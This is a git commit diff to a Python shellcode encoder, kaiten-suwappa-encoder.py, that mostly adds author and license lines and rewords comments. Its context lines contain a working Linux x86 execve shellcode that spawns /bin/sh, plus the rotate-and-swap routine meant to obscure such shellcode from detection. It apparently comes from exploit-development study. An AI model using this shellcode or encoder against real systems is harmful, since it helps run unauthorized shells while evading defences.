a323e4d0ca62dff17bd6c7c95124ff8be1c89221
cloud101 <cloud101eu@gmail.com>
2013-05-01 02:06:00 +0300

    Update kaiten-suwappa-encoder.py

--- kaiten-suwappa-encoder.py
+++ kaiten-suwappa-encoder.py
@@ -1,10 +1,15 @@
 # coding: utf-8
-#our shellcode
+#Author: Lucas Kauffman
+#License: GPLv3 (http://www.gnu.org/licenses/gpl-3.0.txt)
+
+#our unencoded shellcode
 shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 #if the length is uneven, prepend a nop instruction 
 if len(shellcode)%2 == 1:
 	shellcode = "\x90"+shellcode
-#functions from Didier Stevens's transform 
+	
+#These functions come from Didier Stevens's translate script which can be found on 
+#http://blog.didierstevens.com/programs/translate/
 def rol(byte, count):
     while count > 0:
         byte = (byte << 1 | byte >> 7) & 0xFF
@@ -17,7 +22,7 @@ def ror(byte, count):
         count -= 1
     return byte
 
-#initiate an iterator to iterate the bytes
+#initiate an iterator to iterate all bytes
 iterator = iter(bytearray(shellcode))	
 encodedShellcode = list()
 #initiate the boolean to stop iterating list items when none are left
@@ -25,7 +30,7 @@ boolean = True
 #Iterate the list 
 #byte1 : rotate to the right for 4 bits 
 #byte2 : rotate the the left for 2 bits
-#place them back in the list on eachother's positions
+#place them back in the list on eachother's positions (swap)
 
 while boolean:
 	try: 
@@ -37,8 +42,6 @@ while boolean:
 		encodedShellcode.append(byte1)
 	except:
 		boolean = False
-
-
 
 encodedShellcode2 = list()
 #Print everything
